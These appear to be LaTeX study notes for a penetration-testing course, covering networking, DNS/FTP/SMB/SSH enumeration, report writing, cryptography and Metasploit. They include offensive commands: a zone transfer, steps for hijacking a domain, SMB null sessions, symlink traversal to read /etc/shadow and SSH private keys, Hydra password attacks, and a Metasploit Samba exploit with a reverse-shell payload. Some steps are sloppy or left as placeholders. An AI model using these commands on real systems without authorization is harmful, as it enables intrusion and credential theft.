\part*{4 - Networking Fundamentals}

\section*{Local Area Network}

A \textbf{LAN (local area network)} is a network restricted to a small geographical area.

\section*{Wide Area Network}

\textbf{WAN (Wide Area Network)} is a larger network that connects multiple LANs across potentially great distances.

\section*{Internet}

The \textbf{internet} itself is an example of a WAN. It is a global network of networks that uses a standardized protocol to allow billions of devices to interoperate.

\section*{Network Topology}

\begin{itemize}
    \item \textbf{Physical Topology}: The cables that are plugged in.
    \item \textbf{Logical Topology}: The way the data flows.
\end{itemize}

\subsection*{Common Topology Types}

\begin{itemize}
    \item \textbf{Point-to-Point (P2P)}: Direct link between two nodes.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Simple and high-bandwidth.
            \item \textcolor{red}{Cons:} Not very scalable.
        \end{itemize}
    \item \textbf{Bus}: All devices share a single backbone cable.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Cost-effective for simple networks.
            \item \textcolor{red}{Cons:} Prone to collisions and backbone failure.
        \end{itemize}
    \item \textbf{Ring}: Each devices connects two neighbors.
        \begin{itemize}
            \item Token passing.
            \item \textcolor{red}{Cons:} One node failing can cause the entire network to fail.
        \end{itemize}
    \item \textbf{Star}: All devices connect to a \textbf{switch}.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Easy to manage and fault-isolated.
            \item \textcolor{red}{Cons:} Switch failure causes entire network to fail.
        \end{itemize}
    \item \textbf{Mesh}: Every device connects to many or all other devices.
        \begin{itemize}
            \item \textbf{Full}: Node connects to all other nodes.
            \item \textbf{Partial}: Node connects to some of the nodes.
            \item \textcolor{green}{Pros:} Highly reliable and secure.
            \item \textcolor{red}{Cons:} Complex and expensive.
        \end{itemize}
    \item \textbf{Tree}: Hierarchical structure combining a star and a bus.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Scalable.
            \item \textcolor{red}{Cons:} Central hub failure impacts the entire network.
        \end{itemize}
    \item \textbf{Hybrid}: Combination of topologies.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Offres flexibility.
            \item \textcolor{red}{Cons:} High design and maintenance costs.
        \end{itemize}
\end{itemize}

\section*{OSI Model}

The \textbf{OSI model} is a conceptual framework used to understand how data moves from a physical wire up to a user application.

\begin{itemize}
    \item \textbf{Physical (L1)}: Hardware (cables, radio waves, fiber optics).
    \item \textbf{Data Link (L2)}: Local delivery (switches, MAC addresses).
    \item \textbf{Network (L3)}: Routing across networks (IP addresses, routers).
    \item \textbf{Transport (L4)}: End-to-end communication (TCP, UDP, ports).
    \item \textbf{Session (L5)}: Managing connections between applications (Linux socket API, Winsock, AppleTalk, WebRTC, Airdrop).
    \item \textbf{Presentation (L6)}: Data formatting and encryption (SSL/TLS, JPG, ASCII).
    \item \textbf{Application (L7)}: What the user interacts with (HTTP, SSH, DNS).

\end{itemize}

\section*{Networking Devices/Protocols}

\subsection*{MAC Address}

\textbf{MAC Addresses} are \texttt{48-bit} "burned-in" physical identifiers for network hardware.

\subsection*{CAM Table}

\textbf{CAM Tables} are maintained by switches and maps a device's MAC address to a specific physical port on the switch.

\subsection*{Switches}

A \textbf{switch} is the \textit{"brain"} of a LAN.
\begin{itemize}
    \item Ensures data packets sent from one computer does not clutter the network.
\end{itemize}

\subsubsection*{Switches - Handling Data}

\begin{enumerate}
    \item When a packet arrives, the switch looks up the Destination MAC in the CAM table.
    \item \textbf{MAC Address Found:} Data is sent to the corresponding port.
    \item \textbf{MAC Address Unknown:} Data is flooded to every port until the correct device responds.
\end{enumerate}

\subsection*{Address Resolution Protocol (ARP)}

Computers communicate via \textbf{IP addresses}, hardware communicates via \textbf{MAC addresses}.
\medskip

\textbf{ARP Process}:
\begin{itemize}
    \item \textbf{Request}: A host sends a broadcast: "Who has IP 192.168.1.1? Tell 192.168.1.50."
    \item \textbf{Reply}: Device with that IP sends a unicast back: "I have that IP. My MAC Address is AA:BB:CC..."
\end{itemize}

\textbf{ARP Caching}: Computers store mappings in an \textit{ARP Cache} for a few minutes.

\subsection*{Router}

To make routing efficient, IP addresses are \textbf{hierarchical} (ZIP Code > Street > House Number).

\begin{itemize}
    \item \textbf{Network Portion}: Identifies the specific network or "neighborhood" where the device is located.
    \item \textbf{Host Portion}: Identifies the specific device or "house" within that neighborhood.
\end{itemize}

\subsection*{Subnetting}

\textbf{Subnet Mask}: Mathematical "filter" that tells a device exactly where the Network portion ends and the Host portion begins. Determines the boundaries of the local network.
\medskip


\begin{itemize}
    \item \textbf{Local Traffic}: If the destination IP shares the same Network portion as the sender, data travels directly through the switch>
    \item \textbf{Remote Traffic}: If Network portions are different, data must be sent to the Router.
\end{itemize}

\subsection*{CIDR Notation}

Computers see IP addresses and masks as 32-bit binary strings.
\begin{itemize}
    \item \textbf{/24 Mask}: 24 bits reserved for the Network, leaving 8 bits for Hosts \textbf{(256 addresses)}.
    \item \textbf{/16 Mask}: 16 bits reserved for the Network, leaving 16 bits for Hosts \textbf{(65536 addresses)}.
\end{itemize}

\part*{5 - Common Services}

\subsection*{CVE}

A \textbf{CVE (Common Vulnerability and Exposure)} is the result of a rigorous research and reporting process.

\begin{itemize}
    \item \textbf{Discovery}: Flaw is found in a piece of software.
    \item \textbf{Reporting}: Researher notifies software vendor first, giving the vendor time to create a patch.
    \item \textbf{Assignment}: A \textbf{CNA (CVE Numbering Authority)} assigns an unique ID to the flaw.
    \item \textbf{Publication}: CVE is published to \textbf{National Vulnerability Database (NVD)}, given a CVSS Score based on how easy it is to exploit and how much damage it can do.
\end{itemize}

There is a three-step workflow to prove that a version in place is a risk.

\begin{enumerate}
    \item \textbf{Fingerprinting}: Using tools (like \texttt{nmap -sV}) to find the exact version of a service.
    \item \textbf{Searching for CVEs}: Research on that version to find vulnerabilities.
    \item \textbf{Finding a Proof of Concept}: Look for code that successfully demonstrates the exploit.
\end{enumerate}

\subsection*{Domain Name Service (DNS)}

\textbf{DNS} is the resolution engine of the world, mapping domain names to IP addresses and routing email via \textit{MX records} and provides service location via \textit{SRV records}.
\medskip

DNS is hierarchical and chained; no single server knows every address, and instead they have to communicate with other servers.
\medskip

DNS is very useful for pentesters because it can reveal subdomains and the internal infrastructure of many networks.

\subsection*{DNS Interaction}

Purely query based. Tools like \texttt{dig} and \texttt{nslookup} can be used by pentesters to manually query DNS servers.

\begin{itemize}
    \item \textbf{Lookup IP (A Record)}: \texttt{dig <domain\_name> A}
    \item \textbf{Lookup Mail Servers (MX Record)}: \texttt{dig <domain\_name> MX}
    \item \textbf{Lookup Name Servers (NS Record)}: \texttt{dig <domain\_name> NS}
    \item \textbf{Reverse Lookup}: \texttt{dig -x <target\_IP>}
    \item \textbf{Tracing}: \texttt{dig <domain\_name> +trace} (\textit{shows every step of the DNS resolution process})
\end{itemize}

\subsection*{Zone Transfers}

A \textbf{DNS Zone Transfer (AXFR)} is a mechanism intended for replicating DNS records between a primary and a secondary server.
\medskip

The vulnerability exists when a DNS server is misconfigured to allow AXFR requests from any IP address, and thus attackers can obtain a \textit{full copy} of the DNS zone file, revealing every recorded subdomain, internal IP address, and mail server.

\begin{itemize}
    \item \textbf{Attempt Transfer}: \texttt{dig axfr \@<dns\_server\_ip> <domain\_name>}
\end{itemize}

\subsection*{Domain Hijacking}

Attackers can register abandoned domain names or claim abandoned IP addresses of outdated NS records. This allows the attacker to become an "authoritative" source for that domain, allowing them to \textbf{intercept emails}, \textbf{create fake subdomains}, or \textbf{redirect users to phishing sites.}

\begin{itemize}
    \item \texttt{dig ns <domain\_name>} to check if those name servers are active or registrable
    \item Look for \texttt{SERVFAIL} or \texttt{NXDOMAIN} responses when querying nameservers
    \item Register the expired name domain at a public registrar
    \item \texttt{dig <domain\_name>} to verify the hijack
\end{itemize}

\subsection*{File Transfer Protocol (FTP)}

\textbf{File Transfer Protocol (FTP)} is a protocol primarily used for bulk file transfers, website maintenance, and distributing large software packages.

\begin{itemize}
    \item \textbf{Stateful and clear-text}: the commands, usernames, and passwords sent over FTP is visible to anyone sniffing traffic. \textbf{FTPS} implements certificates and fixes this issue.
    \item \textbf{TCP 21}: sends commands and receiving status codes.
    \item \textbf{TCP 20}: used for actual transfer of file data in "Active" mode.
\end{itemize}

\subsubsection*{FTP: Interaction}

\begin{enumerate}
    \item \texttt{ftp <target\_IP>}: Begin with a connection on TCP port 21, followed by authentication.
    \item \texttt{ls -R}: recursively list subdirectories and files similar to the Linux shell.
    \item \texttt{get <filename>}: download files from server to local machine.
    \item \texttt{put <filename>}: upload files from local to server machine.
    \item \texttt{bye} or \texttt{exit}: exit the session.
\end{enumerate}

\subsubsection*{FTP: Anonymous Login}

\textit{Anonymous login} is a legacy feature; turned on only for the admin's convenience but can become a vulnerability when the FTP root directory is set to a sensitive path or when permissions are globally readable.

\begin{enumerate}
    \item \texttt{nmap -sV --script ftp-anon <target>}: check for this vulnerability.
    \item \texttt{wget -m ftp://anonymous:anonymous@<target>}: mirrors entire server locally.
\end{enumerate}

\subsection*{Server Message Block (SMB)}

Originally developed by IBM in the early 1980s as a simple file sharing tool, later heavily adopted and refined by Microsoft and evolved into the primary communication method for Windows-based environments.

\begin{itemize}
    \item \textbf{TCP 445}: modern standard for SMB over IP.
    \item \textbf{UDP 137/138 \& TCP 139}: legacy ports used for NetBIOS communication.
    \item Organized into \textbf{"shares"} - specific folders made available to the server.
    \item Used for \textbf{resource sharing}, including sharing files, printers, and serial ports between computers on a network.
    \item Provides IPC to "request" a service from another computer on the network.
    \item Backbone of \textbf{Windows Active Directory}.
\end{itemize}

\subsubsection*{SMB: Interaction}

\begin{enumerate}
    \item \texttt{smbclient -L //<target\_IP>/ -U <username>}: shows all available shares.
    \item \texttt{smbclient //<target\_IP>/<share\_name> -U <username>}: connect to a share.
    \item \texttt{put <filename>}: uploading a file.
    \item \texttt{sudo mount -t cifs //<target\_IP>/<share\_name> -U /mnt/smb -o}: mount as a drive.
\end{enumerate}

\subsubsection*{SMB: Null Sessions}

\textbf{SMB null sessions} is an unauthenticated connection to a Windows SMB server that allows an attacker to query the system for information without any credentials (enabled when \texttt{RestrictAnonymous = 0} in the registry). It allows for enumeration of the network to provide enough information for password spraying, targeted phishing attacks, and sometimes even direct file access.

\begin{enumerate}
    \item \texttt{rpcclient -U "" -N <target>}: successful prompt indicates vulnerability.
    \item \texttt{enumdomusers} or \texttt{querydispinfo}: inside \texttt{rpcclient} to enumerate account names.
    \item \texttt{smbclient -L //<target> -N}: reveals hidden or administrative shares available for access.
    \item \texttt{enum4linux -a <target>}: scrapes all available system and user data in one command.
\end{enumerate}

\subsubsection*{SMB: Symlink Traversal}

\textbf{Symlink traversal} occurs when the Samba service is configured to follow "wide links" that point outside of the designated share path. Attackers with write access to a share can create symbolic links to root, effectively bypassing the share.

\begin{enumerate}
    \item \texttt{symlink / root\_portal}: point the share entry to the server's root directory.
    \item \texttt{cd root\_portal}: yeah
    \item \texttt{get /etc/shadow} or \texttt{/root/.ssh/id\_rsa}: yeah
\end{enumerate}

\subsection*{Secure Shell (SSH)}

The \textbf{Secure Shell (SSH)} protocol was designed specifically to replace insecure, clear-text protocols such as Telnet, rlogin, and FTP.

\begin{itemize}
    \item Used for secure remote command-line access, remote command execution, and encrypted file transfers via \textbf{SFTP} or \textbf{SCP}.
    \item \textbf{TCP 22}: universal port for SSH.
    \item \textbf{Public key cryptography}: Establishes an encrypted tunnel between the client and server before any authentication happens.
\end{itemize}

\subsubsection*{SSH: Interaction}

SSH is almost always preferred over Telnet or FTP because it protects passwords from being sniffed over the wire.

\begin{enumerate}
    \item \texttt{ssh <username>@<target\_IP>}: connect to remote terminal.
    \item \texttt{ssh <username>@<target\_IP> '<command>'}: connects, runs a command, and exits.
    \item \texttt{scp <local\_file> <username>@<target\_IP>:/home/user/}: copy file to server.
    \item \texttt{scp <username>@<target\_IP>:/etc/passwd ./local\_copy.txt}: copy file from server.
    \item \texttt{sftp <username>@<target\_IP>}: FTP-like interface running over SSH.
\end{enumerate}

\part*{6 - Writing Reports}

\section*{Types of Reports}

\subsection*{Vulnerability Assessment}

\begin{itemize}
    \item \textbf{Deliverable}: High-volume list of every potential flaw found by an automated scanner.
    \item Designed for broad coverage.
\end{itemize}

\subsection*{Penetration Test}

\begin{itemize}
    \item \textbf{Deliverable}: Manual testing and full proof of concept.
    \item Fcouses on the \textbf{attack chain}, or proving how an attacker can move laterally through a network.
\end{itemize}

\subsection*{Compliance-Driven Reports}

\begin{itemize}
    \item Reporst are written specifically to satisfy regulatory bodies.
    \item Often, reports must map technical findings directly to legal violations.
\end{itemize}

\subsection*{Specialized Tests}
\begin{itemize}
    \item Can have different frameworks or deliverables from common penetration tests.
\end{itemize}

\section*{Drafts}

Different clients have different priorities and preferences, and some organizations will request a draft report that allows clients.

\begin{itemize}
    \item Gives clients the opportunity to provide feedback, clarify details, or explain how they plan to address specific findings.
    \item Some organizations will request an immediate report upon discovery of a critical vulnerability.
\end{itemize}

\section*{Nontechnical Components}

\subsection*{Legal \& Overview}

Good reports must begin with a clear Executive Summary and Engagement Overview that establishes legal and administrative boundaries of the test.

\begin{itemize}
    \item \textbf{Sensitivity Warning}: Explicitly states who owns the data and the penalties for unauthorized release.
    \item \textbf{Contact Information}: Clear line of communication between testing team and client's emergency response contacts.
    \item \textbf{Executive Summary}: High-level summary for executives.
    \item \textbf{Engagement Overview}: Outlines the objectives and goals of the penetration test, along with a rigid scope list of what was allowed to be tested to ensure testers didn't stray into unauthorized systems.
\end{itemize}

\subsection*{Executive Summary}

The most-read part of the document, written for non-technical stakeholders who allocate budgets.

\begin{itemize}
    \item \textbf{Refrain} from using \textbf{technical language} in this section.
    \item Give an overview of what was tested.
    \item Give an extremely broad overview of the most impactful findings.
    \item Include any other information you find absolutely necessary for non-technical executives to know.
\end{itemize}

\subsection*{Engagement Overview}

\begin{itemize}
    \item Provide a list of in-scope assets.
    \item Good practice to create and provide a \textbf{visual network diagram}.
\end{itemize}

\section*{Technical Report and Findings}

\subsection*{Calculating CVSS Scores}

\textbf{CVSS} (Common Vulnerability Scoring System) provides a numerical score (0.0 - 10.0) based on ease of exploitation and severity.
\medskip

Sometimes, a raw CVSS score isn't enough. An \textit{adjusted CVSS score} accounts for the difference in the vulnerability of browser on a locked-down kiosk versus that on the CEO's laptop.

\subsection*{Anatomy of a Technical Finding}

Each finding in the Technical Report section must follow a consistent modular structure:

\begin{itemize}
    \item \textbf{Adjusted CVSS Score}: Numerical rating (0.0 - 10.0) that accounts for the specific likelihood and impact on the client's business.
    \item \textbf{Details}: High-level explanation of the vulnerability.
    \item \textbf{Confirmation}: Step-by-step evidence, including specific commands used and terminal output, along with screenshots where necessary for understanding/proof.
    \item \textbf{Impact}: Worst-case scenarios for the client.
    \item \textbf{Mitigation}: Clear, actionable advice on how to fix/mitigate the issue.
\end{itemize}

\section*{Additional Reporting Advice}

\subsection*{QA Lifestyle}

Reports should never go from pentester directly to the client. It should pass through a \textbf{Quality Assurance (QA)} phase.

\begin{itemize}
    \item \textbf{Technical Accuracy}: Are the reproduction steps correct?
    \item \textbf{Consistency}: Does the \textbf{Executive Summary} match the \textbf{Technical Findings}?
    \item \textbf{Tone}: Is the language professional?
\end{itemize}

\subsection*{Appendices}

The \textbf{Appendices} are for the "deep dive" information that would clutter up the main report:

\begin{itemize}
    \item \textbf{Tool List}: Transparency about what software was used.
    \item \textbf{Methodology}: Explaining the standard followed.
    \item \textbf{OSINT \& Phishing}: Detailed logs of what was found in public records or the results of social engineering campaigns.
\end{itemize}

\section*{7 - Basic Cryptography}

\subsection*{Encoding vs. Encryption}

\textbf{Encoding} is a public transformation of data.

\begin{itemize}
    \item Prioritizes \textbf{usability} and \textbf{reproducibility}.
    \item Ensures binray data can survive being sent over protocols that only support text.
    \item \textit{Example:} Base64, URL encoding, ASCII.
\end{itemize}

\bigskip

\textbf{Encryption} transforms data using a \textbf{secret} (a key).

\begin{itemize}
    \item Without the secret, the transformed data should be indistinguishable from random noise.
    \item \textit{Example:} AES, RSA, PGP.
\end{itemize}

\subsubsection*{Real World Example: Encoding}

\begin{itemize}
    \item \textbf{URL Encoding}
        \begin{itemize}
            \item \textbf{Input:} \texttt{Hello World!}
            \item \textbf{Encoded:} \texttt{Hello\%20World\%21}
            \item Why? Browsers can't handle spaces or "!" in URLs reliably.
        \end{itemize}
    \item \textbf{Base64 Encoding}
        \begin{itemize}
            \item \textbf{Input:} \texttt{admin:password123}
            \item \textbf{Encoded:} \texttt{YWRtaW46cGFzc3dvcmQxMjM=}
            \item Why? Used to send credentials in HTTP Basic Auth headers without breaking the protocol.
        \end{itemize}
\end{itemize}

\subsection*{Base64}

\begin{itemize}
    \item Most common encoding variation.
    \item Processes data in \textbf{24-bit} groups, reresenting them as four \textbf{6-bit} units.
    \item Padding in the form of \texttt{=} signs is added to the end.
\end{itemize}

\subsection*{Symmetric Encryption}

\textbf{Symmetric encryption} uses a single shared secret key for both encrytpion and decryption.

\begin{itemize}
    \item Anyone with the keyc an read the data.
    \item Fast, used to encrypt large amounts of information.
    \item \textcolor{red}{Cons:} Key distribution - safely sharing the secret key without interception and keeping it from being leaked afterwards.
\end{itemize}

\bigskip

Instead of trying to break \textbf{symmetric encryption}, people instead look for:

\begin{itemize}
    \item Hardcoded encryption keys in source code.
    \item Keys stored in configuration files.
    \item Weak encryption modes.
    \item Reused keys across systems.
\end{itemize}

\subsubsection*{Common Symmetric Ciphers}

\begin{itemize}
    \item \textbf{AES (Advanced Encryption Standard)}: Used in TLS, disk encryption, VPNs.
    \item \textbf{ChaCha20}: Modern, fast cipher used in TLS and mobile systems.
\end{itemize}

\subsection*{Asymmetric Encryption}

\textbf{Asymmetric cryptography} (public key cryptography) uses two related keys instead of a single shared key:

\begin{itemize}
        \textbf \textbf{Public Key}: Shared with everyone, used to encrypt data.
        \textbf \textbf{Private Key}: Kept secret - decrypts data encrypted with the \textbf{public key}.
\end{itemize}

\bigskip

SSH keys are a good example of \textbf{asymmetric cryptography}. The private key never leaves the client machine, so if the server was compromised the attackers will only have access to your public key.

\subsubsection*{Common Asymmetric Ciphers}

\begin{itemize}
    \item \textbf{RSA}: Widely used for certificates, signatures, and legacy encryption.
    \item \textbf{Elliptic Curve Cryptography (ECC)}: Modern alternative used on occasion in TLS, SSH, and certificates. (super cool shit)
\end{itemize}

\subsection*{Password Attacks}

Two types of password attacks:

\begin{itemize}
    \item \textbf{Online Attacks}: Pentester attemptse authentication directly against a running service. May trigger alerts, rate limits, or account lockouts.
    \item \textbf{Offline Attacks}: Happen after obtaining password hashes or encrypted credential stores that can then be cracked locally without interacting with the target.
\end{itemize}

\bigskip

In addition, there are different ways for cracking passwords:

\begin{itemize}
    \item \textbf{Brute Force Attacks}: attempt every possible character combination.
        \begin{itemize}
            \item Computationally expensive.
            \item Usually impractical.
        \end{itemize}
    \item \textbf{Dictionary Attacks}: Use curated wordlists containing real passwords, leaked credentials, and common patterns.
        \begin{itemize}
            \item Highly effective due to human nature.
            \item Much faster than a \textbf{brute force attack}.
        \end{itemize}
    \item \textbf{Hybrid Attacks}: Modify dictionary wordlist entries by adding numbers, symbols, and capitalization changes, or patterns such as seasons or company names to each word.
\end{itemize}

\subsubsection*{Password Spraying}

\textbf{Password Spraying}: Takes brute force password attacks but targets a group of accounts with the same password.

\begin{itemize}
    \item Reduces the chance of lockouts.
    \item Extremely effective in real corporate environments due to organizations enforcing complexity but not uniqueness of passwords.
\end{itemize}

\subsection*{Hydra}

Fast, online password-guessing tool used by pentesters to test login services. Performs both \textbf{brute force} and \textbf{dictionary} attacks.

\begin{enumerate}
    \item Identify the service, such as using scanning tools to confirm attack vectors.
    \item Prepare inputs, including username lists and password wordlists.
    \item Run Hydra attack:
        \begin{itemize}
            \item \texttt{hydra -l exampleuser -P passwords.txt ssh://target\_IP}: single user with password list
            \item \texttt{hydra -L users.txt -P passwords.txt ssh://target\_IP}: multiple users and passwords
        \end{itemize}
\end{enumerate}

\part*{8 - Introduction to Metasploit}

\textbf{Metasploit} is an open-source poject used for exploiting security vulnerabilities on host machines.

\bigskip

\textbf{IMPORTANT}: It is crucial to keep Metasploit up to date.

\subsection*{MSFConsole}

\begin{itemize}
    \item \texttt{sudo msfdb init}: initiate the Metasploit database.
    \item \texttt{msfconsole}: start the metasploit console
    \item \texttt{show exploits}: list all commands
    \item \texttt{search 2007-2447}: search for an exploit
    \item \texttt{grep usermap search cve-2007}: command line grep
\end{itemize}

\subsection*{Metasploit Exploitation Plan}

\begin{itemize}
    \item Find a vulnerability.
    \item \texttt{use multi/samba/usermap\_script}: use an exploit that exploits vulnerability
    \item \texttt{show options}, \texttt{set RHOST 172.16.28.161}: set options for the exploit
    \item \texttt{show payloads}: determine payload to use
    \item \texttt{set PAYLOAD cmd/unix/reverse\_perl}: set the payload
    \item \texttt{show advanced}: show even more options
    \item \texttt{exploit}: run the exploit!
\end{itemize}
